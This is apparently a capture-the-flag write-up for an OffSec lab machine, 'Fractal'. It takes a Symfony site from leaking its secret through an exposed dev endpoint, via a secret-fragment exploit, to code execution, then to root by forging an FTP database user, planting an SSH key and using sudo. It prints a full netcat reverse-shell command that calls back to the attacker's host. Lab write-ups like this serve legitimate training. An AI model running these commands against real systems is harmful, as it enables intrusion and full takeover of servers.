---
layout: post
category: writeup
---

## Machine Info

- Name: Fractal
- Description: A fractal is a way of seeing infinity
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!
|_http-favicon: Unknown favicon MD5: 231567A8CC45C2CF966C4E8D99A5B7FD
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 2 disallowed entries 
|_/app_dev.php /app_dev.php/*
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

dirsearch:
```bash
offsec  dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u 192.168.154.233

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 1102725

Output File: /home/kali/.dirsearch/reports/192.168.154.233_24-01-26_09-04-08.txt

Error Log: /home/kali/.dirsearch/logs/errors-24-01-26_09-04-08.log

Target: http://192.168.154.233/

[09:04:08] Starting: 
[09:04:10] 301 -  316B  - /img  ->  http://192.168.154.233/img/
[09:04:11] 403 -  280B  - /icons/
[09:04:22] 301 -  316B  - /css  ->  http://192.168.154.233/css/
[09:04:27] 301 -  312B  - /app.php  ->  http://192.168.154.233/
[09:04:27] 301 -  315B  - /js  ->  http://192.168.154.233/js/
[09:04:29] 403 -  280B  - /javascript/
[09:04:29] 301 -  323B  - /javascript  ->  http://192.168.154.233/javascript/
[09:04:34] 403 -   46B  - /config.php
[09:04:38] 200 -   86B  - /robots.txt
```

From this I can see that we have a robots.txt which has two entries, app_dev.php which means that dev mode is enabeld. This allows us to use the EOS tool which allows us to read source code off of the website!

```bash
eos git:(master) ✗ eos scan http://192.168.154.233/app_dev.php               
[+] Starting scan on http://192.168.154.233/app_dev.php
[+] 2024-01-26 09:25:24.987995 is a great day

[+] Info
[!]   Symfony 3.4.46
[!]   PHP 7.4.3
[!]   Environment: dev

[+] Request logs
[+] No POST requests

[+] Phpinfo
[+] Available at http://192.168.154.233/app_dev.php/_profiler/phpinfo
[+] Found 31 PHP variables
[+] Did not find any Symfony variable

[+] Project files
[+] Queue: 176 left
[+] Found: composer.lock, run 'symfony security:check' or submit it at https://security.symfony.com
[!] Found the following files:
[!]   app/config/config_dev.yml
[!]   app/config/config_prod.yml
[!]   app/config/config_test.yml
[!]   app/config/config.yml
[!]   app/AppKernel.php
[!]   app/config/parameters.yml
[!]   app/config/parameters.yml.dist
[!]   app/config/routing.yml
[!]   app/config/security.yml
[!]   app/config/routing_dev.yml
[!]   app/config/services.yml
[!]   composer.json
[!]   composer.lock
[!]   README.md
[!]   var/cache/dev/profiler/index.csv
[!]   web/app_dev.php
[!]   web/app.php
```


```bash
eos git:(master) ✗ eos get http://192.168.154.233/app_dev.php app/config/parameters.yml
# This file is auto-generated during the composer install
parameters:      
    database_host: 127.0.0.1
    database_port: 3306
    database_name: symfony      
    database_user: symfony
    database_password: symfony_db_password
    mailer_transport: smtp
    mailer_host: 127.0.0.1
    mailer_user: null
    mailer_password: null
    secret: 48a8538e6260789558f0dfe29861c05b
```

Now that I have the secret, I can use secret fragment exploit to get RCE:
```bash
python3 secret_fragment_exploit.py -s 48a8538e6260789558f0dfe29861c05b http://192.168.154.233/app_dev.php/_fragment --ignore-original-status

Trying 4 mutations...
  (OK) sha256 48a8538e6260789558f0dfe29861c05b http://192.168.154.233/app_dev.php/_fragment 404 http://192.168.154.233/app_dev.php/_fragment?_path=&_hash=caJMITqdR2amJQ5jzqgwcUishnLU6SY3d1QH3IkoChg%3D

Trying both RCE methods...
  Method 1: Success!

PHPINFO: http://192.168.154.233/app_dev.php/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=eWYRMzYJ7DCG2I%2F3lN%2BEwgPqlw%2FNn%2B2VNCKoQfREtag%3D
RUN: secret_fragment_exploit.py 'http://192.168.154.233/app_dev.php/_fragment' --method 1 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.154.233/app_dev.php/_fragment' --function phpinfo --parameters what:-1
```

```bash
offsec python3 secret_fragment_exploit.py 'http://192.168.154.233/app_dev.php/_fragment' --method 1 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.154.233/app_dev.php/_fragment' --function 'shell_exec' --parameters cmd:whoami
```

![](assets/images/2024-01-26-OFFSEC-Fractal-writeup-image-1.png)

We can see that www-data was returned, let's get a reverse shell

```bash
offsec python3 secret_fragment_exploit.py 'http://192.168.154.233/app_dev.php/_fragment' --method 1 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.154.233/app_dev.php/_fragment' --function 'shell_exec' --parameters cmd:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.222 80 >/tmp/f '
http://192.168.154.233/app_dev.php/_fragment?_path=cmd%3Drm%2B%252Ftmp%252Ff%253Bmkfifo%2B%252Ftmp%252Ff%253Bcat%2B%252Ftmp%252Ff%257Csh%2B-i%2B2%253E%25261%257Cnc%2B192.168.45.222%2B80%2B%253E%252Ftmp%252Ff%2B%26_controller%3Dshell_exec&_hash=DAEILg5%2Btt08%2BZsLbVldwLoQA8%2F2xEzKP7V2FO8WO6Y%3D
```

I struggled a bit, because of firewall, I eventually landed on port 80 which worked and I got a shell!

```bash
offsec nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.45.222] from (UNKNOWN) [192.168.154.233] 43096
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

## Privilege Escalation

We then access the proftpd mysql instance and create a new entry for the benoit user:

Generate password:
```bash
/bin/echo "{md5}"`/bin/echo -n "testpass" | openssl dgst -binary -md5 | openssl enc -base64`
{md5}F5rUXGziy5fPECniEgRugQ==
```

Add user:

```sql
mysql> INSERT INTO `ftpuser` (`id`, `userid`, `passwd`, `uid`, `gid`, `homedir`, `shell`, `count`) VALUES (NULL, 'benoit', '{md5}F5rUXGziy5fPECniEgRugQ==', '1000', '1000', '/', '/bin/bash', '0');
SUCCESS
mysql> select * from ftpuser;
+----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
| id | userid | passwd                        | uid  | gid  | homedir       | shell         | count | accessed            | modified            |
+----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
|  1 | www    | {md5}RDLDFEKYiwjDGYuwpgb7Cw== |   33 |   33 | /var/www/html | /sbin/nologin |     0 | 2022-09-27 05:26:29 | 2022-09-27 05:26:29 |
|  2 | benoit | {md5}F5rUXGziy5fPECniEgRugQ== | 1000 | 1000 | /             | /bin/bash     |     0 | 2024-01-26 15:42:48 | 2024-01-26 15:42:48 |
+----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec)

mysql>
```

I then will FTP in and create a .ssh directory then add my authorized_keys file in there and ssh in:

```bash
ftp> cd /home
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||63608|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 benoit   benoit       4096 Sep 27  2022 benoit
226 Transfer complete
ftp> cd benoit
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||53371|)
150 Opening ASCII mode data connection for file list
-r--r--r--   1 benoit   benoit         33 Jan 26 14:01 local.txt
226 Transfer complete
ftp> mkdir .ssh
257 "/home/benoit/.ssh" - Directory successfully created
ftp> put authorized_keys
local: authorized_keys remote: authorized_keys
229 Entering Extended Passive Mode (|||33386|)
150 Opening BINARY mode data connection for authorized_keys
100% |******************************************************************************************************************|   563       12.20 MiB/s    00:00 ETA
226 Transfer complete
563 bytes sent in 00:00 (8.75 KiB/s)
```

```bash
offsec ssh benoit@192.168.154.233
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 26 Jan 2024 03:47:27 PM UTC

  System load:  0.0               Processes:               229
  Usage of /:   67.0% of 9.74GB   Users logged in:         0
  Memory usage: 65%               IPv4 address for ens160: 192.168.154.233
  Swap usage:   13%


0 updates can be applied immediately.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
$ whoami
benoit
```

Finally i check sudo permissions:
```bash
benoit@fractal:~$ sudo -l
Matching Defaults entries for benoit on fractal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User benoit may run the following commands on fractal:
    (ALL) NOPASSWD: ALL
benoit@fractal:~$ sudo su
root@fractal:/home/benoit# whoami
root
```

best,
gerbsc